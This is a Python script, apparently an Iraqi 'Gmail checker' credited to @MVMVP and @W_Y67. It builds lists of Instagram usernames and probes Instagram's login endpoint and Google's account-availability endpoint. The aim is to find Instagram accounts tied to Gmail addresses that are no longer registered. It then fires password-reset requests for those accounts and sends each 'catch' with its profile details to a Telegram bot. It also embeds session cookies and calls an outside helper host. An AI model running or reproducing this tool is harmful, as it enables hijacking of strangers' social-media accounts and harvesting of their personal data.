import os
import time
try :
    import requests
    import user_agent
    import datetime
    import webbrowser
    import pyfiglet
    import threading
    import signal
except ImportError as error :
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install datetime')
    os.system('pip install webbrowser')
    os.system('pip install pyfiglet')
    os.system('pip install threading')
    os.system('pip install signal')
    os.system('pip install pyfiglet')
    os.system('cls'if os.name=='nt' else'clear')
    time.sleep(1)
    print('Done.')
    exit()
import requests
import os
from uuid import uuid4
import random
from user_agent import generate_user_agent
import datetime
import json
from time import sleep
from os import system
from datetime import date
import socket
import pyfiglet
a=0
z=0
b=0
j=0
m=0
ruu=0
ru=0
ma=0
bp =0
bk=0
bd=0
k=0
t=0
x=0
g=0
L=0
h=0
A=0
f=0
Ru = 0
qw =0
ya =0
yaa=0
hh=0
h=0
hhh=0
yaaa=0
E=0
zaidip = socket.gethostname()
ipzaid = socket.gethostbyname(zaidip)
#pas = input('Enter Your ID ')
#if pas=="87kk":
#	system('clear')
#else:
#	system('clear')

#pas = input('\033[1;35m# ID : ')
#if pas =='Zaid.Zaid':
#	system('clear')
#else:
#	system('clear')
#	print('\033[1;32m# ID False')
#	exit()
hu= pyfiglet.figlet_format(' MVMVP ')
print(f"\033[6;93m{hu}")
print('\n\033[2;90m\rGmail Tool 0.8 \033[1;31m, \033[1;33mNew Gmail Tool 0.9\n')
print('\033[1;32mThe Tool Free <> MVMVP - W_Y67 <> IRAQ\n')
ll= datetime.datetime.now()
r = requests.session()
lll = date.today()
r = requests.session()
print('\033[1;36mTele @MVMV - @W_Y67\n')	
def Gmail():
	try:
		fie =open('gmail.txt','r').read().splitlines()
	except FileNotFoundError as error:
		system('clear')
		print('File Error gmail.txt')
		exit()
	cookies =input("🔹 Sen ID - سيشن ايدي : ")		
	took =input('\033[1;36m🔹 Token Bot - توكن البوت  :  ')
	if took=='':
		system('clear')
		print('Tok False')
		exit()
	try:
		idddd =int(input('\033[1;34m🔹 ID Account - ايدي تلكرام : '))
	except ValueError as error:
		system('clear')
		print('ID False')
		exit()
	system('clear')
	global z,a,x,lll,j,g,t,L,f,qw,E,h,A,Ru,ruu,ru,bd,bk,ma,bp,ya,yaa,yaaa,hh,h,hhh
	for BL in fie:
		if ('@gmail.com') in BL:
			url = 'https://b.i.instagram.com/api/v1/accounts/login/'
			KLL= BL.split('@')[0]
			headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
			uid = str(uuid4())
			data = {
			'uuid':uid, 
			'password':'ffffdddddaaa666', 
			'username':'{}' .format(BL),
			'device_id':uid, 
			'from_reg':'false', 
			'_csrftoken':'missing', 
			'login_attempt_countn':'0'
			}
			try:
				re = requests.post(url,headers=headers,data=data).text	
			except requests.exceptions.ConnectionError as error:
				system('clear')
				print('intrinet Error * حدث خطأ في الاتصال')
				continue
			
			if ('"invalid_user"')in re:
				os.system('cls'if os.name=='net'else'clear')
				ma+=1
				print(f'\033[1;32m[=] - Gmail : {L}\n\033[1;33m[=] - Bad Mail : {bd}\n\033[1;33m[=] - Bad insat : {ma}\n\033[1;35m[=] - Error username : {E}\n\033[1;32m[=] - Telegram : W_Y67 - MVMVP\n')
			elif ('"bad_password"') in re:
				url3 ='https://android.clients.google.com/setup/checkavail'
				headers = {
	        		'Content-Length':'98',
	        		'Content-Type':'text/plain; charset=UTF-8',
	        		'Host':'android.clients.google.com',
	        		'Connection':'Keep-Alive',
	        		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
				data= json.dumps({
	        		'username':BL,
	        		'version':'3',
	        		'firstName':'AbaLahb',
	        		'lastName':'AbuJahl'})
				try:
					res=requests.post(url3,headers=headers,data=data)
				except requests.exceptions.ConnectionError as error:
					system('clear')
					print('intrinet Error * حدث خطأ في الاتصال')
					continue
				if res.json()['status'] =='USERNAME_UNAVAILABLE':
					os.system('cls'if os.name=='net'else'clear')
					bd+=1
					print(f'\033[1;32m[=] - Gmail : {L}\n\033[1;33m[=] - Bad Mail : {bd}\n\033[1;33m[=] - Bad insat : {ma}\n\033[1;35m[=] - Error username : {E}\n\033[1;32m[=] - Telegram : W_Y67 - MVMVP\n')
				elif res.json()['status'] =='SUCCESS':
						with open('True.txt','a') as f8:
							f8.write(f'{BL}\n')
						os.system('cls'if os.name=='net'else'clear')
						L+=1
						print(f'\033[1;32m[=] - Gmail : {L}\n\033[1;33m[=] - Bad Mail : {bd}\n\033[1;33m[=] - Bad insat : {ma}\n\033[1;35m[=] - Error username : {E}\n\033[1;32m[=] - Telegram : W_Y67 - MVMVP\n')
						urlr='https://www.instagram.com/accounts/account_recovery_ajax/'
						headr= {
					        'accept': '*/*',
					        'accept-encoding': 'gzip, deflate, br',
					        'accept-language': 'en-US,en;q=0.9',
					        'content-length': '336',
					        'content-type': 'application/x-www-form-urlencoded',
					        'cookie': 'mid=YuPxZAABAAEUVYcD2B0cFEzLEyuU; ig_did=50092572-86B8-4779-8D7D-ED783D6BE001; dpr=3; datr=lPHjYm79ZCBQZ-8kyLncySC7; shbid="572\05454072972258\0541691059333:01f70b5caa78629654a33ffe9055bdc7663b824064ba3854ecfade7109c72ee455eb5eb8"; shbts="1659523333\05454072972258\0541691059333:01f7ce1fd97040b48210c72b760bfbbf68254544b85860f356f3dc04622ee5bfd6edb2d9"; rur="RVA\05454072972258\0541691069797:01f7513337be7c4309672fc0a95436c4f0b60d9f1ff74355b61efadb1b1079fb38505eea"; csrftoken=tFhHVxw72H6VCMdP2tplXrBbqoFckW5N',
					        'origin': 'https://www.instagram.com',
					        'referer': 'https://www.instagram.com/',
					        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
					        'sec-ch-ua-mobile': '?0',
					        'sec-fetch-dest': 'empty',
					        'sec-fetch-mode': 'cors',
					        'sec-fetch-site': 'same-origin',
					        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
					        'viewport-width': '30',
					        'x-asbd-id': '437806',
					        'x-csrftoken': 'tFhHVxw72H6VCMdP2tplXrBbqoFckW5N',
					        'x-ig-app-id': '936619743392459',
					        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
					        'x-instagram-ajax': 'caee87137ae9',
					        'x-requested-with': 'XMLHttpRequest'
						}
						datar={
							'query': f'{BL}'
						}
						rq = requests.post(urlr,headers=headr,data=datar).json()
						#print(rq)
						try:
							B19 =f"{BL}"
							fa =str(rq['options']['can_use_facebook'])
							if fa =='True':
								L3 = 'مرتبط في الفيس بوك'
							else:
								L3='غير مرتبط في الفيس بوك'
							ph = str(rq['options']['can_send_phone'])
							if ph =='True':
								L5 = ('مرتبط برقم')
							else:
								L5='غير مرتبط برقم'
						except KeyError as Error:
							L7 ='الريست لا يعمل'
						G1 = (KLL)
						iip=(G1)
						url22 = f'https://www.instagram.com/{iip}/?__a=1&__d=dis'
						head1 = {
			                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			                'accept-encoding': 'gzip, deflate, br',
			                'accept-language': 'en-US,en;q=0.9',
			                'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={cookies}',
			                'referer': 'https://www.instagram.com/{}/'.format(iip),
			                'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
			                'sec-ch-ua-mobile': '?1',
			                'sec-fetch-dest': 'document',
			                'sec-fetch-mode': 'navigate',
			                'sec-fetch-site': 'snone',
			                'upgrade-insecure-requests': '1',
			                'user-agent': generate_user_agent(),
						}
						rr =requests.get(url22,headers=head1).json()
						try:
							nam = str(rr['graphql']['user']['full_name'])
							iddd = str(rr['graphql']['user']['id'])
							fol = str(rr['graphql']['user']['edge_followed_by']['count'])
							fols =str(rr['graphql']['user']['edge_follow']['count'])
							isp = str(rr['graphql']['user']['is_private'])
							bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
							
							re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")
							#except requests.exceptions.JSONDecodeError as error:
#								tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text=🗿 〝 حيآڪ الُِله ، رقمِ الصيدِ 〞 {j}\n--------------------------------\n📟 〝 آسم آلُِمستخـدِم 〞 : {iip}\n🗞️ 〝 الاسہم 〞  {nam}\n📧 〝 آلبَريد 〞 : {iip}@gmail.com\n🚻 〝 عدد المتہٰابعيٰن 〞 : {fol}\n👥 〝 يٰتہٰابع 〞 : {fols}\n🗺 〝 عدد المنشوراتہ 〞 : {bio}\n🔐 〝 خـصوُصية الُحسابَ 〞 : {isp}\n🔁 〝 رٍيست الُحسابَ 〞 : يعمل\n⌚️ 〝 تہاريخ الصہٰيٰد 〞 : {lll}\n————————×————————\n♜ 〝 حـــقٌــوُقٌـ,ـ 〞 : @MVMVP ↷ @W_Y67 \n\nالُمبرمج زْيد ڪرٍيم')
#								ru= requests.post(tlg)
#								
#								continue
							ree = re.json()
							dat = ree['data']
							j+=1
							headers = {
        # 'Content-Length': '305',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com',
        'Connection': 'Keep-Alive',
        'User-Agent': 'Instagram 6.12.1 Android (25/7.1.2; 160dpi; 383x680; LENOVO/Android-x86; 4242ED1; x86_64; android_x86_64; en_US)',
        # Requests sorts cookies= alphabetically

        'Accept-Language': 'en-US',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': 'AQ==',
        # 'Accept-Encoding': 'gzip',
							}
							data = {
        'ig_sig_key_version': '4',
        "user_id":iddd
							}
							res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers, data=data).json()
							rs =str(res['obfuscated_email'])
							try:
								uq=(f'''🗿 ⌯ زيد گريمـ جآبلگ صـيد 🚸
🏴‍☠️|⌯رقمـ آلصـيد : {j}\n📟 ⌯ آسـمـ آلمـسـتخدمـ : {iip}\n🗞️ ⌯ آلآسـمـ : {nam}\n📧 ⌯ آلبريد : {iip}@gmail.com\n👥 ⌯ عددآلمـتآبعين : {fol}\n🚻 ⌯ يتآبع : {fols}\n🗺 ⌯ عدد آلمـنشـور : {bio}\n⌛️ ⌯ تآريخ آنشـآء آلحسـآب : {dat}\n🔐 ⌯ خصـوصـية آلحسـآب : {isp}\n🛡️ ⌯ آلفيسـبوگ : {L3}\n📲 ⌯ رقمـ آلهہآتف : {L5}\n🔁 ⌯ ريسـت آلحسـآب : يعمل\n🗝 ⌯ ريسـت آلبآسـورد : {rs}\n⌚️ ⌯ تآريخ آلصـيد  : {lll} 

♜ ⌯ حقوق : @MVMVP - @W_Y67
♜ ⌯ برمـجة زيد كريم ☢️''')
								tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={uq}')
								ru= requests.post(tlg)
							except UnboundLocalError as error:
								L+=1
								os.system('cls'if os.name=='net'else'clear')
								print(f'\033[1;32m[=] - Gmail : {L}\n\033[1;33m[=] - Bad Mail : {bd}\n\033[1;33m[=] - Bad insat : {ma}\n\033[1;35m[=] - Error username : {E}\n\033[1;32m[=] - Telegram : W_Y67 - MVMVP\n')
								uq=(f'''🗿 ⌯ زيد گريمـ جآبلگ صـيد 🚸
🏴‍☠️|⌯رقمـ آلصـيد : {j}\n📟 ⌯ آسـمـ آلمـسـتخدمـ : {iip}\n🗞️ ⌯ آلآسـمـ : {nam}\n📧 ⌯ آلبريد : {iip}@gmail.com\n👥 ⌯ عددآلمـتآبعين : {fol}\n🚻 ⌯ يتآبع : {fols}\n🗺 ⌯ عدد آلمـنشـور : {bio}\n⌛️ ⌯ تآريخ آنشـآء آلحسـآب : {dat}\n🔐 ⌯ خصـوصـية آلحسـآب : {isp}\n⌚️ ⌯ تآريخ آلصـيد  : {lll} 

♜ ⌯ حقوق : @MVMVP - @W_Y67
♜ ⌯ برمـجة زيد كريم ☢️''')
								tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={uq}')
								ru= requests.post(tlg)	
						except KeyError as error :
							E+=1
							os.system('cls'if os.name=='net'else'clear')
							print(f'\033[1;32m[=] - Gmail : {L}\n\033[1;33m[=] - Bad Mail : {bd}\n\033[1;33m[=] - Bad insat : {ma}\n\033[1;35m[=] - Error username : {E}\n\033[1;32m[=] - Telegram : W_Y67 - MVMVP\n')
#########Hotmail#########

a=0
v=0
ok = '4567'
bb ="qwertyuioplkjhgfdsazxcvbnm"
def zaid9():
    
    
    
 
        
        
        
        
        global bb,a,v,ok
        while True:
        	number= random.choice(ok)
        	
	        username = str(''.join(random.choice(bb)for i in range(7))).lower()
	        
	        
	        url=f'https://www.instagram.com/web/search/topsearch/?context=blended&query={username}&rank_token=0.38549261586414585&include_reel=true'
	        head11 = {
	        'accept': '*/*',
	        'accept-encoding': 'gzip, deflate, br',
	        'accept-language': 'en-US,en;q=0.9',
	       # 'content-length': '336',
	#        'content-type': 'application/x-www-form-urlencoded',
	        'cookie': 'ig_nrcb=1; mid=Yn0mhAABAAF67zpxcopyc_DiDqlW; ig_did=66C4F652-81B2-40FB-AD7E-98260457287F; fbm_124024574287414=base_domain=.instagram.com; csrftoken=B5EvgsGegpjkHbwakmeZzZeibMUyPXOo; ds_user_id=479320179; sessionid=479320179:YJP7Mp7LRlvDVe:17; shbid="6887\054479320179\0541685041134:01f78226f1ed25a1fd638da513ee9fc0bd85ad7b75335c66e00546dddc526839ed8673b3"; shbts="1653505134\054479320179\0541685041134:01f7359bb436c3c2a6a593d450045a6d47feeeb49309f4e3e34f16846a86521cd654f96c"; fbsr_124024574287414=-t_KkO2zVCJ8dtHJUTSp1hNWF4FvrBOMic2GrdYXfXo.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRQmtRTDJLM0F6eC1NYUE5blBMQ3lrYXBONFVQYUU4RDJ3cG1GcmlJTjFqN0x4aVU1UWdtekFGcDEwaEtHZ2Y3RUdhY3VFNFBFMDdwN0VNWUtnTFVyT0lPbGNLN3BBWEExVDBCbjRtTnI2bVFSbFpBY0tuOWp4ZS1HNGd3QVk2bUZwdmZoeXVHeXV5U09ZcWtIVW83VWM3V1ZFUTdERG4wQU16dDN6WmVxckxYOGhVMXE2WnRqbEhvMlQwdVRHQzZ0SXpWak4wT3otNjUyU2pkQVRLbmZBcmM1MkEzeVQ2c0JmbGZUX2M3alQ4TWZuZU02b3NQcmZuTF9CVnptbWp4eVBYbm85alRDRUMyRzNGLWgyNE5Ua0Y4NkVZbDRFR1Q0NExqQkl3NnZfekdHYW5MckF3Q3dMVUJMMF81Mzd3bDlnIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUJ5SmR4WTE5T0t5M1pDQlpBTkJqaWc5d0M0bTlqSVdUZHdWVTdJa01PTjBXVkZ2ZXVpSE4waHZTamF4cXpaQTJxWkJzVXR6cXBMWkNwYzJNYzVJS0lUVW5DMHJNWWZuVDRVRVFhYWhaQ2JKZm03bEQ1Q1hNdE14bGVyV2FFRGZrT2U2Y0RSSmg2OWFtZlV4eGFVRmFHMGlkRHR3VnJZNXo1VzVMZ0U5Q2UiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY1MzUwNjE1NH0; rur="ASH\054479320179\0541685042266:01f7314545b2fc6431250d9f16c78ee257c43ef7fffb40f551f9109cef47d42ed774d508"',
	       # 'origin': 'https://www.instagram.com',
	        'referer': 'https://www.instagram.com/explore/search/',
	        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
	        'sec-ch-ua-mobile': '?0',
	        'sec-fetch-dest': 'empty',
	        'sec-fetch-mode': 'cors',
	        'sec-fetch-site': 'same-origin',
	        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
	        'x-asbd-id': '437806',
	        'x-csrftoken': 'B5EvgsGegpjkHbwakmeZzZeibMUyPXOo',
	        'x-ig-app-id': '936619743392459',
	        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
	        #x-requested-with': 'caee87137ae9',
	        'x-requested-with': 'XMLHttpRequest'
	    }
	        
	        
	 
	        
	        data2={
	        	'context': 'blended',
	        	'query': '{}'.format(username),
	        	'rank_token': '0.38549261586414585',
	        	'include_reel': 'true'
	        
	        }
	        y= requests.get(url,headers=head11).json()
	        try:
	        	iddd = len(str(y['users'][0]['user']['pk']))
	        #print(iddd)
	        except IndexError as error:
	        	v+=1
	        	continue
	        for ll in range(0,iddd):
	        	try:
	        		nn = str(y['users'][ll]['user']['username'])
	        		a+=1
	        		os.system('cls'if os.name=="net"else'clear')
	        		print(f"\033[1;32m[-] - Done : {a}\n[-] - Error : {v}\n[-] - Username : {nn}\n\033[1;33m[-] - Telegram : @MVMVP - @W_Y67")
	        		with open('gmail.txt','a') as f3:
	        			f3.write(f'{nn}@gmail.com\n')
	        	except IndexError as error:
	        		continue
	        		
 
        	
        
        
          
def Cl():
        global a,z,t,x
        cookies =input("🔹 \033[1;33mSessionid - \033[1;32mاضف سيشن ايدي هنا  : ")
        
        iii = input('\033[1;33m🔹Enter Your User list - \033[1;32mاضف يوزر لسحب لستة : \n')
        
        
       
        
        def cv():
        	#global cookies,iii
        	
        	
	        url22 = f'https://www.instagram.com/{iii}/?__a=1&__d=dis'
	        head1 = {
		            'accept': '*/*',
		            'accept-encoding': 'gzip, deflate, br',
		            'accept-language': 'en-US,en;q=0.9',
		            'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={cookies}',
		            'referer': 'https://www.instagram.com/{}/'.format(iii),
		            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
		            'sec-ch-ua-mobile': '?0',
		            'sec-fetch-dest': 'empty',
		            'sec-fetch-mode': 'cors',
		            'sec-fetch-site': 'same-origin',
		            'user-agent': generate_user_agent(),
		            'x-asbd-id': '437806',
		            'x-ig-app-id': '936619743392459',
		            'x-ig-www-claim': 'hmac.AR3iJo8fToOaW2YqFg8Fs_vZX0vRsp_WJuOh9w4JPDrYKWOV',
		            'x-requested-with': 'XMLHttpRequest'
		        }
		    
	        
	        
	        try:
	        	rr = r.get(url22,headers=head1).json()
	        	
	        except json.decoder.JSONDecodeError as error:
	        	system('clear')
	        	print('* \033[1;32mBloked or Band Account')
	        	exit()
	        	
	        try:
	         fol = str(rr['graphql']['user']['edge_follow']['count'])
	         idd = str(rr['logging_page_id'])
	         ss = idd.split('_')[1]
	        except KeyError as error :
	             print('plsess user True...!')
	             time.sleep(1)
	             system('clear')
	             while True:
	             	Cl()
	             #exit()
	        x = int(fol)
	        url4 = f'https://i.instagram.com/api/v1/friendships/{ss}/following/?count={fol}'
	        head4 ={
		            'accept': '*/*',
		            'accept-encoding': 'gzip, deflate, br',
		            'accept-language': 'en-US,en;q=0.9',
		            'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={cookies}',
		            'referer': 'https://www.instagram.com/',
		            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
		            'sec-ch-ua-mobile': '?0',
		            'sec-fetch-dest': 'empty',
		            'sec-fetch-mode': 'cors',
		            'sec-fetch-site': 'same-origin',
		            'user-agent': generate_user_agent(),
		            'x-asbd-id': '437806',
		            'x-ig-app-id': '936619743392459',
		            'x-ig-www-claim': 'hmac.AR3iJo8fToOaW2YqFg8Fs_vZX0vRsp_WJuOh9w4JPDrYKWOV',
		            'x-requested-with': 'XMLHttpRequest'
		
		        }
	        data4 ={
	        	'count': fol
		        }
	        re = requests.get(url4,headers=head4,data=data4).json()
	      
	        try:
	        	for zaid in range(0,x):
	        	    us = str(re['users'][zaid]['username'])
		            a+=1 
		            os.system('cls' if os.name == 'nt' else'clear')
		
		            print(f'\033[1;35m[=] - Done >> [{a}]\n[=] - User >> \033[1;36m[{us}]\n\033[1;35m[=] - Time >> [{ll}]\n\033[1;32m[=] - Telegram : @MVMVP - @W_Y67')
		            Rq = ['@gmail.com']
		            Tq = random.choice(Rq)
		           
		             
		            with open('gmail.txt','a') as f9:
		                f9.write(f'{us}@gmail.com\n')
		         
		            
		              
	        except IndexError as error :
		        iii=us
		        cv()
		         
		         
		         
		        
	     
       
        
      
       
        
	        
	   
	        
def O():
	try:
		os.remove('gmail.txt')		
		print('Done - تم حذف الملف بنجاح')
	except FileNotFoundError as error:
		system('clear')
		print('Error - ملف gmail.txt غير متوفر في جهازك')
print('\033[1;32m[1] - List Username - انشاء لستة عشوائية\n[2] - List username - انشاء لستة من يوزر\n[3] - Cheker List - فحص لستة\n[0] - Remove List - حذف لستة\n\n\n⚠️ \033[1;33mThe Number 2 False run plase wite... - رقم ٢ حاليا لا يعمل\n\n')
try:
	H = int(input('\033[1;35m[!] - Enter Your : '))
	system("clear")
except ValueError as error:
	system('clear')
	print('Error - لا يجوز اختيار احرف')
	exit()
if H ==1:
		''
		zaid9()
elif H==2:
	print('The Number soon run.....')
elif H==3:
	
	Gmail()
elif H==0:
	O()
else:
	system('clear')
	print('Error - اختيار خطأ')
	exit()
